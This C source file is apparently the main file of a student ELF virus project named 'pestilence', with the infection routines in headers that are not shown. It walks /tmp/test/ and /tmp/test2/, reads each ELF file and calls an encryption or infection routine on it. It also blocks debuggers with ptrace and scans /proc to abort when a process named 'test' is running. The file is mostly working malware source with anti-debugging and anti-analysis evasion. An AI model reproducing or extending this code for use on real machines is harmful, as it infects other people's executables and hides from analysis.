#include "pestilence.h"

void do_virus(char *dirName, t_woody *woody)
{
    DIR *dir;
    struct dirent *ent;

    if ((dir = opendir(dirName)) != NULL)
    {
        while ((ent = readdir(dir)) != NULL)
        {
            if (ft_strcmp(ent->d_name, ".") != 0 && ft_strcmp(ent->d_name, "..") != 0)
            {
                if (read_elf_file(woody, ft_strjoin(dirName, ent->d_name)) == ERROR_CODE)
                {
                    continue;
                }
                if (parse_info(woody) == ERROR_CODE)
                {
                    free(woody->addr);
                    continue;
                }
                if (encrypt_func(woody, ft_strjoin(dirName, ent->d_name)) == ERROR_CODE)
                {
                    free(woody->addr);
                    continue;
                }
                free(woody->addr);
            }
        }
        closedir(dir);
    }
}

int check_process()
{
    DIR *dir;
    struct dirent *ent;
    char buf[512];

    if (!(dir = opendir("/proc")))
    {
        return (ERROR_CODE);
    }

    while ((ent = readdir(dir)) != NULL)
    {
        if (atoi(ent->d_name) != 0)
        {
            snprintf(buf, sizeof(buf), "/proc/%s/stat", ent->d_name);
            int fd = open(buf, O_RDONLY);

            if (fd >= 0)
            {
                int size;
                if ((size = read(fd, buf, 512)) > 0)
                {
                    buf[size - 1] = '\0';
                    if (strstr(buf, "test") != NULL){
                        return (ERROR_CODE);
                    }
                }
                close(fd);
            } else {
                return (ERROR_CODE);
            }
        }
    }
    return (0);
}

int main(int argc, char **argv)
{
    (void)argv;

    if (argc != 1)
    {
        return (ERROR_CODE);
    }

    if (ptrace(PTRACE_TRACEME, 0, 1, 0) < 0)
    {
        printf("DEBUGGING..\n");
        exit(1);
    }

    if (check_process() == ERROR_CODE)
    {
        return (ERROR_CODE);
    }

    t_woody woody;
    ft_memset(&woody, 0, sizeof(woody));

    do_virus("/tmp/test/", &woody);
    do_virus("/tmp/test2/", &woody);

    return (0);
}
